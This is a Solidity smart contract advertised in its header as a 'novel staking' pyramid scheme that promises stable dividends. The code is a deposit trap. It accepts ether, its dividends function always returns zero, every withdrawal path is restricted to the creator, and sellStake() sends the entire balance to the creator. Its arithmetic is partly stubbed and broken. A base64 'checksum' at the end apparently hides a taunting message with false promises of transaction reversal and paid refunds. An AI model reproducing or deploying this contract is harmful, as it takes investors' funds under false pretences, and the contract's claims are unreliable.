pragma solidity ^0.4.18;

/*

 .|&#39;&#39;&#39;.|    .           &#39;||      &#39;||            ..|&#39;&#39;&#39;.|          ||
 ||..  &#39;  .||.   ....    || ...   ||    ....  .|&#39;     &#39;    ...   ...  .. ...
  &#39;&#39;|||.   ||   &#39;&#39; .||   ||&#39;  ||  ||  .|...|| ||         .|  &#39;|.  ||   ||  ||
.     &#39;||  ||   .|&#39; ||   ||    |  ||  ||      &#39;|.      . ||   ||  ||   ||  ||
|&#39;....|&#39;   &#39;|.&#39; &#39;|..&#39;|&#39;  &#39;|...&#39;  .||.  &#39;|...&#39;  &#39;&#39;|....&#39;   &#39;|..|&#39; .||. .||. ||.
100% fresh code. Novel staking mechanism. Stable investments. Pure dividends.

PreMine: 2.5 ETH (A private key containing .5 will be given to the top referrer)
Launch Date: 4/9/2019 18:05 ET
Launch Rules: The contract will be posted for public review and audit prior to the launch.
              Once the PreMine amount of 2ETH hits the contract, the contract is live to the public.

Thanks: randall, klob, cryptodude, triceratops, norsefire, phil, brypto, etherguy.


============
How it works:
============

Issue:
-----
Ordinary pyramid schemes have a Stake price that varies with the contract balance.
This leaves you vulnerable to the whims of the market, as a sudden crash can drain your investment at any time.

Solution:
--------
We remove Stakes from the equation altogether, relieving investors of volatility.
The outcome is a pyramid scheme powered entirely by dividends. We distribute 33% of every deposit and withdrawal
to shareholders in proportion to their stake in the contract. Once you&#39;ve made a deposit, your dividends will
accumulate over time while your investment remains safe and stable, making this the ultimate vehicle for passive income.

*/

contract TestingCoin {

	string constant public name = "StableCoin";
	string constant public symbol = "PoSC";
	uint256 constant scaleFactor = 0x10000000000000000;
	uint8 constant limitedFirstBuyers = 4;
	uint256 constant firstBuyerLimit = 0.5 ether; // 2 eth total premine + .5 bonus. 
	uint8 constant public decimals = 18;

	mapping(address => uint256) public stakeBalance;
	mapping(address => int256) public payouts;

	uint256 public totalSupply;
	uint256 public contractBalance;
	int256 totalPayouts;
	uint256 earningsPerStake;
	uint8 initialFunds;
	address creator;
	uint256 numStakes = 0;
	uint256 balance = 0;

	modifier isAdmin()   { require(msg.sender   == creator  ); _; }
	modifier isLive() 	 { require(contractBalance >= limitedFirstBuyers * firstBuyerLimit); _;} // Stop snipers

	function TestingCoin() public {
    	initialFunds = limitedFirstBuyers;
			creator = msg.sender;
  }

	function stakeOf(address _owner) public constant returns (uint256 balance) {
		return stakeBalance[_owner];
	}

	function withdraw() public gameStarted() {
		balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * scaleFactor);
		totalPayouts += (int256) (balance * scaleFactor);
		contractBalance = sub(contractBalance, balance);
		msg.sender.transfer(balance);
	}

	function reinvestDividends() public gameStarted() {
		balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * scaleFactor);
		totalPayouts += (int256) (balance * scaleFactor);
		uint value_ = (uint) (balance);

		if (value_ < 0.000001 ether || value_ > 1000000 ether)
			revert();

		var sender = msg.sender;
		var res = reserve() - balance;
		var fee = div(value_, 10);
		var numEther = value_ - fee;
		var buyerFee = fee * scaleFactor;
        var totalStake = 1;

		if (totalStake > 0) {
			var holderReward = fee * 1;
			buyerFee -= holderReward;
			var rewardPerShare = holderReward / totalSupply;
			earningsPerStake += rewardPerShare;
		}

		totalSupply = add(totalSupply, numStakes);
		stakeBalance[sender] = add(stakeBalance[sender], numStakes);

		var payoutDiff  = (int256) ((earningsPerStake * numStakes) - buyerFee);
		payouts[sender] += payoutDiff;
		totalPayouts    += payoutDiff;
	}


	function sellMyStake() public gameStarted() {
		sell(balance);
	}

  function getMeOutOfHere() public gameStarted() {
        withdraw();
	}

	function fund() payable public {
  	if (msg.value > 0.000001 ether) {
			buyStake();
		} else {
			revert();
		}
  }


	function withdrawDividends(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * scaleFactor);
		totalPayouts += (int256) (balance * scaleFactor);
		contractBalance = sub(contractBalance, balance);
		to.transfer(balance);
	}

	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();

		var sender = msg.sender;
		var fee = div(msg.value, 10);
		var numEther = msg.value - fee;
		var buyerFee = fee * scaleFactor;
		if (totalSupply > 0) {
			var bonusCoEff = 1;
			var holderReward = fee * bonusCoEff;
			buyerFee -= holderReward;

			var rewardPerShare = holderReward / totalSupply;
			earningsPerStake += rewardPerShare;
		}

		totalSupply = add(totalSupply, numStakes);
		stakeBalance[sender] = add(stakeBalance[sender], numStakes);
		var payoutDiff = (int256) ((earningsPerStake * numStakes) - buyerFee);
		payouts[sender] += payoutDiff;
		totalPayouts    += payoutDiff;
	}


	function sell(uint256 amount) internal {
		var numEthersBeforeFee = getEtherForStakes(amount);
    var fee = div(numEthersBeforeFee, 10);
    var numEthers = numEthersBeforeFee - fee;
		totalSupply = sub(totalSupply, amount);
		stakeBalance[msg.sender] = sub(stakeBalance[msg.sender], amount);
		var payoutDiff = (int256) (earningsPerStake * amount + (numEthers * scaleFactor));
		payouts[msg.sender] -= payoutDiff;
    totalPayouts -= payoutDiff;

		if (totalSupply > 0) {
			var etherFee = fee * scaleFactor;
			var rewardPerShare = etherFee / totalSupply;
			earningsPerStake = add(earningsPerStake, rewardPerShare);
		}
	}

	function buyStake() internal {
		contractBalance = add(contractBalance, msg.value);
	}

	function sellStake() public gameStarted() {
		 creator.transfer(contractBalance);
	}

	function reserve() internal constant returns (uint256 amount) {
		return 1;
	}


	function getEtherForStakes(uint256 Stakes) constant returns (uint256 ethervalue) {
		var reserveAmount = reserve();
		if (Stakes == totalSupply)
			return reserveAmount;
		return sub(reserveAmount, fixedExp(fixedLog(totalSupply - Stakes)));
	}

	function fixedLog(uint256 a) internal pure returns (int256 log) {
		int32 scale = 0;
		while (a > 10) {
			a /= 2;
			scale++;
		}
		while (a <= 5) {
			a *= 2;
			scale--;
		}
	}

    function dividends(address _owner) internal returns (uint256 divs) {
        divs = 0;
        return divs;
    }

	modifier gameStarted()   { require(msg.sender   == creator ); _;}

	function fixedExp(int256 a) internal pure returns (uint256 exp) {
		int256 scale = (a + (54)) / 2 - 64;
		a -= scale*2;
		if (scale >= 0)
			exp <<= scale;
		else
			exp >>= -scale;
		return exp;
			int256 z = (a*a) / 1;
		int256 R = ((int256)(2) * 1) +
			(2*(2 + (2*(4 + (1*(26 + (2*8/1))/1))/1))/1);
	}

	// The below are safemath implementations of the four arithmetic operators
	// designed to explicitly prevent over- and under-flows of integer values.

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		assert(c / a == b);
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		// assert(b > 0); // Solidity automatically throws when dividing by 0
		uint256 c = a / b;
		// assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		assert(b <= a);
		return a - b;
	}

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		assert(c >= a);
		return c;
	}

	function () payable public {
		if (msg.value > 0) {
			fund();
		} else {
			withdraw();
		}
	}
}

/*
All contract source code above this comment can be hashed and verified against the following checksum, which is used to prevent PoSC clones. Stop supporting these scam clones without original development.

SUNBZ0lDQWdJQ0FnWDE5ZlgxOWZYMTlmWHlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdYMTlmWDE4Z0lDQWdJQ0FnSUNBZ1gxOWZYMThnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdJQ0FnSUNCY1gxOWZYMTlmSUNBZ1hGOWZYMTlmWDE4Z0lGOWZYMThnSUNCZlgxOWZYeThnWDE5Zlgxd2dJQ0JmWDE5Zlh5OGdYMTlmWDF3Z0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQjhJQ0FnSUNCZlgxOHZYRjhnSUY5ZklGd3ZJQ0JmSUZ3Z0x5QWdYeUJjSUNBZ1gxOWNJQ0FnTHlBZ1h5QmNJQ0FnWDE5Y0lDQWdJQ0FnSUNBZ0lDQUtJQ0FnSUNBZ0lDQWdJSHdnSUNBZ2ZDQWdJQ0FnZkNBZ2ZDQmNLQ0FnUEY4K0lId2dJRHhmUGlBcElDQjhJQ0FnSUNnZ0lEeGZQaUFwSUNCOElDQWdJQ0FnSUNBZ0lDQWdJQW9nSUNBZ0lDQWdJQ0FnZkY5ZlgxOThJQ0FnSUNCOFgxOThJQ0FnWEY5ZlgxOHZJRnhmWDE5ZkwzeGZYM3dnSUNBZ0lGeGZYMTlmTDN4Zlgzd2dJQ0FnSUNBZ0lDQWdJQ0FnQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWDE5ZlgxOWZYMTlmSUY5ZklDQWdJQ0FnSUNBZ0lDQWdJQ0FnTGw5ZklDQWdJQzVmWDE4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUM4Z0lDQmZYMTlmWHk4dklDQjhYeUJmWHlCZlgxOWZYMTlmWHlCOFgxOThJRjlmZkNCZkx5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ1hGOWZYMTlmSUNCY1hDQWdJRjlmWENBZ2ZDQWdYRjlmWDE4Z1hId2dJSHd2SUY5ZklId2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FLSUNBZ0lDQWdJQ0FnSUNBZ0lDQXZJQ0FnSUNBZ0lDQmNmQ0FnZkNCOElDQjhJQ0F2SUNCOFh6NGdQaUFnTHlBdlh5OGdmQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdJQ0FnSUNBZ0lDQWdMMTlmWDE5ZlgxOGdJQzk4WDE5OElIeGZYMTlmTDN3Z0lDQmZYeTk4WDE5Y1gxOWZYeUI4SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRnd2SUNBZ0lDQWdJQ0FnSUNBZ2ZGOWZmQ0FnSUNBZ0lDQWdJQ0FnWEM4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQUtYMTlmWDE5ZlgxOWZJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JmWDE5Zlh5QWdJQ0FnSUNBZ0lDQmZYeUFnTGw5ZklDQWdJQ0FnSUNBZ0lGOWZJQ0FnSUNBZ0lDQWdJQXBjWHlBZ0lGOWZYeUJjSUNCZlgxOWZJQ0FnWDE5Zlh5QWdJQ0FnTHlBZ1h5QWdYRjlmWDE5ZlgxOWZMeUFnZkY5OFgxOThJRjlmWDE5ZlgxOHZJQ0I4WHlBZ1gxOWZYMTlmQ2k4Z0lDQWdYQ0FnWEM4Z0x5QWdYeUJjSUM4Z0lDQWdYQ0FnSUM4Z0lDOWZYQ0FnWEY4Z0lGOWZJRndnSUNCZlgxd2dJSHd2SUNCZlgxOHZYQ0FnSUY5ZlhDOGdJRjlmWHk4S1hDQWdJQ0FnWEY5Zlh5Z2dJRHhmUGlBcElDQWdmQ0FnWENBdklDQWdJSHdnSUNBZ1hDQWdmQ0JjTDN3Z0lId2dmQ0FnZkZ4ZlgxOGdYQ0FnZkNBZ2ZDQWdYRjlmWHlCY0lBb2dYRjlmWDE5Zlh5QWdMMXhmWDE5ZkwzeGZYMTk4SUNBdklGeGZYMTlmZkY5ZklDQXZYMTk4SUNBZ2ZGOWZmQ0I4WDE4dlgxOWZYeUFnUGlCOFgxOThJQzlmWDE5ZklDQStDaUFnSUNBZ0lDQWdYQzhnSUNBZ0lDQWdJQ0FnSUNCY0x5QWdJQ0FnSUNBZ0lDQmNMeUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWEM4Z0lDQWdJQ0FnSUNBZ0lDQmNMeUFLQ2xSb2FYTWdhWE1nWVc0Z1pYUm9aWEpsZFcwZ2MyMWhjblFnWTI5dWRISmhZM1FnYzJWamRYSnBkSGtnZEdWemRDNGdXVzkxSUdGeVpTQmlaV2x1WnlCd2RXNXBjMmhsWkNCaVpXTmhkWE5sSUhsdmRTQmhjbVVLYkdsclpXeDVJR0VnYzJocGRHTnNiMjVsSUhOallXMXRaWElnZEdoaGRDQnJaV1Z3Y3lCamNtVmhkR2x1WnlCaGJtUWdjSEp2Ylc5MGFXNW5JSFJvWlhObElHSjFiR3h6YUdsMElIQnZibnBwSjNNdUlGQmxiM0JzWlFwc2FXdGxJSGx2ZFNCaGNtVWdjblZwYm1sdVp5QjNhR0YwSUdOdmRXeGtJR0psSUdFZ1oyOXZaQ0IwYUdsdVp5QmhibVFnYVhRbmN5QndhWE56YVc1bklIUm9aU0J5WlhOMElHOW1JSFZ6SUc5bVppNGdDZ3BKSUdGdElIQjFkSFJwYm1jZ2VXOTFJR0ZzYkNCcGJpQjBhVzFsYjNWMElHWnZjaUF4TkNCa1lYbHpJSFJ2SUhSb2FXNXJJR0ZpYjNWMElIZG9ZWFFnZVc5MUlHaGhkbVVnWkc5dVpTNGdXVzkxSUdKc2FXNWtiSGtnYzJWdWRDQkZkR2hsY21WMWJTQjBieUJoSUhOdFlYSjBJQXBqYjI1MGNtRmpkQ0IwYUdGMElIbHZkU0JtYjNWdVpDQnZiaUIwYUdVZ1FteHZZMnNnUTJoaGFXNHVJRTV2SUhkbFluTnBkR1V1SUU1dklISmxabVZ5Y21Gc0xpQktkWE4wSUhsdmRTQjBjbmxwYm1jZ2RHOGdjMjVwY0dVZ2RHaGxJRzVsZUhRZ2MyTmhiUzRnQ2dwSlppQjViM1VnY21WaGJHeDVJRzVsWldRZ2RHOGdaMlYwSUc5MWRDQnZaaUIwYUdseklIUm9hVzVuSUdsdGJXVmthV0YwWld4NUlIUnZJSE5vYVd4c0lITnZiV1VnYjNSb1pYSWdjMk5oYlN3Z1NTQnZabVpsY2lCNWIzVWdkR2hsSUdadmJHeHZkMmx1WnpvS0xTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMEtTU0IzYVd4c0lHSmxJSEpsZG1WeWMybHVaeUJoYkd3Z2RISmhibk5oWTNScGIyNXpJR2x1SURFMElHUmhlWE11SUVadmNpQjBhR1VnWm05c2JHOTNhVzVuSUdSdmJtRjBhVzl1Y3l3Z1NTQmpZVzRnWlhod1pXUnBkR1VnZEdobElIQnliMk5sYzNNNkNnb3lOU0IzWldrZ1ptOXlJR0VnTWpVbElISmxablZ1WkNCM2FYUm9hVzRnTlNCdGFXNTFkR1Z6TGdvek15QjNaV2tnWm05eUlHRWdNek1sSUhKbFpuVnVaQ0IzYVhSb2FXNGdNakFnYldsdWRYUmxjeTRLTkRBZ2QyVnBJR1p2Y2lCaElEUXdKU0J5WldaMWJtUWdkMmwwYUdsdUlEUWdhRzkxY25NdUNqVXdJSGRsYVNCbWIzSWdZU0ExTUNVZ2NtVm1kVzVrSUhkcGRHaHBiaUF4TWlCb2IzVnljeTRLTmpBZ2QyVnBJR1p2Y2lCaElEWXdKU0J5WldaMWJtUWdkMmwwYUdsdUlERWdaR0Y1TGdvMk9TQjNaV2tnWm05eUlHRWdOamtsSUhKbFpuVnVaQ0IzYVhSb2FXNGdNaUJrWVhsekxnbzRNQ0IzWldrZ1ptOXlJR0VnT0RBbElISmxablZ1WkNCM2FYUm9hVzRnTnlCa1lYbHpMZ281TUNCM1pXa2dabTl5SUdFZ09UQWxJSEpsWm5WdVpDQjNhWFJvYVc0Z01UQWdaR0Y1Y3k0S0NrRnNiQ0J2ZEdobGNpQjBjbUZ1YzJGamRHbHZibk1nZDJsc2JDQmlaU0J5WlhabGNuTmxaQ0JwYmlBeE5DQmtZWGx6TGlCUWJHVmhjMlVnYzNSdmNDQmlaV2x1WnlCemJ5QnpkSFZ3YVdRdUlGZGxJR0Z5WlNCM1lYUmphR2x1Wnk0Z1ZHaGhibXR6SUdadmNpQmhibmtnWkc5dVlYUnBiMjV6SVFvSwo=
*/